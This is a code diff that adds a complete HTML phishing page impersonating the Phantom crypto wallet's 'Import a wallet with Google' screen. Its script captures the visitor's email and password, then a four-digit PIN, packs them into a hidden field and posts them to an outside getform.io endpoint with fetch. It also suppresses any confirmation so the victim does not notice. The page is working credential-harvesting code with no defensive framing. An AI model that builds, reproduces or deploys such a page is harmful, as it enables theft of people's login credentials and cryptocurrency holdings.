@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Phantom Wallet UI</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      height: 100vh;
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background-color: #1e1e1e;
+      color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background-color: #2a2a2a;
+      padding: 40px;
+      border-radius: 16px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+    }
+
+    .title {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: #a0a0a0;
+      margin-bottom: 30px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #444;
+      border-radius: 8px;
+      background-color: #1e1e1e;
+      color: white;
+      font-size: 14px;
+    }
+
+    input::placeholder {
+      color: #888;
+      font-family: 'Inter', sans-serif;
+    }
+
+    input[type="submit"],
+    button {
+      width: 100%;
+      padding: 12px;
+      margin-top: 20px;
+      background: linear-gradient(135deg, #9c27b0, #7e57c2);
+      border: none;
+      color: white;
+      font-size: 16px;
+      border-radius: 10px;
+      font-weight: 600;
+      cursor: pointer;
+    }
+
+    input[type="submit"]:hover,
+    button:hover {
+      background: linear-gradient(135deg, #ba68c8, #9575cd);
+    }
+
+    .footer {
+      font-size: 12px;
+      color: #aaaaaa;
+      margin-top: 20px;
+    }
+
+    #pin-page {
+      display: none;
+    }
+
+    .pin-inputs {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      margin-top: 20px;
+    }
+
+    .pin-inputs input {
+      width: 50px;
+      height: 50px;
+      font-size: 24px;
+      text-align: center;
+      border-radius: 8px;
+      border: 1px solid #444;
+      background-color: #1e1e1e;
+      color: white;
+    }
+
+    .back-btn {
+      margin-top: 20px;
+      background: none;
+      border: none;
+      color: #aaa;
+      cursor: pointer;
+      text-decoration: underline;
+      font-size: 14px;
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="container" id="login-page">
+    <div class="title">Import a wallet</div>
+    <div class="subtitle">Import an existing wallet with Google</div>
+    <form id="loginForm">
+      <input type="text" id="email" placeholder="Email" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <input type="submit" value="Submit">
+    </form>
+    <p class="footer">&copy; Phantom 2025</p>
+  </div>
+
+  <div class="container" id="pin-page">
+    <div class="title">Enter your Pin</div>
+    <form id="pinForm" action="https://getform.io/f/bllzgvpb" method="POST">
+      <div class="pin-inputs">
+        <input type="text" maxlength="1" name="pin1" required>
+        <input type="text" maxlength="1" name="pin2" required>
+        <input type="text" maxlength="1" name="pin3" required>
+        <input type="text" maxlength="1" name="pin4" required>
+      </div>
+      <!-- hidden field to store combined login -->
+      <input type="hidden" name="login" id="hiddenLogin">
+      <input type="submit" value="Submit">
+      <button type="button" class="back-btn" onclick="goBack()">← Go Back</button>
+    </form>
+  </div>
+
+  <script>
+    const loginForm = document.getElementById('loginForm');
+    const pinPage = document.getElementById('pin-page');
+    const loginPage = document.getElementById('login-page');
+    const hiddenLogin = document.getElementById('hiddenLogin');
+
+    loginForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      hiddenLogin.value = `Email: ${email}\nPassword: ${password}`;
+
+      loginPage.style.display = 'none';
+      setTimeout(() => {
+        pinPage.style.display = 'block';
+      }, 1200); // Delay of 1.2s
+    });
+
+    function goBack() {
+      pinPage.style.display = 'none';
+      loginPage.style.display = 'block';
+    }
+
+    // Auto move to next pin field
+    const pinInputs = document.querySelectorAll('.pin-inputs input');
+    pinInputs.forEach((input, idx) => {
+      input.addEventListener('input', () => {
+        if (input.value && idx < pinInputs.length - 1) {
+          pinInputs[idx + 1].focus();
+        }
+      });
+    });
+
+    // Prevent default Getform redirect
+    const pinForm = document.getElementById('pinForm');
+    pinForm.addEventListener('submit', function(e) {
+      e.preventDefault();
+      const formData = new FormData(pinForm);
+      fetch(pinForm.action, {
+        method: 'POST',
+        body: formData
+      }).then(() => {
+        // Don't show the thank you message
+        window.location.href = "#"; // Stay on the page or redirect silently
+      });
+    });
+  </script>
+
+</body>
+</html>
+
+
